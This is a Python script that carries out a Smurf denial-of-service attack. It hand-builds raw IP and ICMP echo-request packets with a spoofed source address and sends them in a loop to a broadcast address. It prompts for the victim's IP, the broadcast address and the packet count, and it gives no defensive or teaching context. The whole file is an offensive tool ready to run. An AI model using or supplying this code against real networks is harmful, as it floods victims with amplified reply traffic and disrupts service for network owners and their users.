import socket
import sys
import time


def IPHeader(source, destination, proto):
    """Create an IP header."""
    packet = b''
    packet += b'\x45'  # Version + Header Length
    packet += b'\x00'  # Type of Service
    packet += b'\x00\x54'  # Total Length
    packet += b'\xab\xcd'  # Identification
    packet += b'\x40'  # Flags
    packet += b'\x00'  # Fragment Offset
    packet += b'\x40'  # TTL
    packet += proto  # Protocol
    packet += b'\x00\x00'  # Header Checksum
    packet += socket.inet_aton(source)  # Source IP
    packet += socket.inet_aton(destination)  # Destination IP
    return packet


def CreateICMPRequest():
    """Create an ICMP Echo Request."""
    packet = b''
    packet += b'\x08'  # ICMP Type (Echo Request)
    packet += b'\x00'  # Code
    packet += b'\x00\x00'  # Checksum
    packet += b'\x12\x34'  # Identifier
    packet += b'\x00\x01'  # Sequence Number
    packet += b'\x61' * 56  # Payload (56 bytes)
    return packet


def smurfattack(source_ip, broadcast_ip, count):
    """Perform Smurf Attack."""
    try:
        icmp_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        icmp_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        print(f"[INFO] Sending {count} ICMP Echo Requests from {source_ip} to {broadcast_ip}...\n")
        for i in range(count):
            packet = IPHeader(source_ip, broadcast_ip, b'\x01') + CreateICMPRequest()
            icmp_socket.sendto(packet, (broadcast_ip, 0))
            print(f"[INFO] Packet {i + 1}/{count} sent.")
            time.sleep(0.1)
        icmp_socket.close()
        print("[INFO] Smurf Attack completed.")
    except PermissionError:
        print("[ERROR] You need root privileges to run this script.")
    except Exception as e:
        print(f"[ERROR] {e}")

if __name__ == "__main__":
    try:
        source_ip = input("Enter source IP address (e.g., 192.168.1.10): ").strip()
        broadcast_ip = input("Enter broadcast IP address (e.g., 192.168.1.255): ").strip()
        count = int(input("Enter number of packets to send: ").strip())
        smurfattack(source_ip, broadcast_ip, count)
    except KeyboardInterrupt:
        print("\n[INFO] User interrupted the program. Exiting...")
    except ValueError:
        print("[ERROR] Invalid input. Please enter correct values.")
        
        
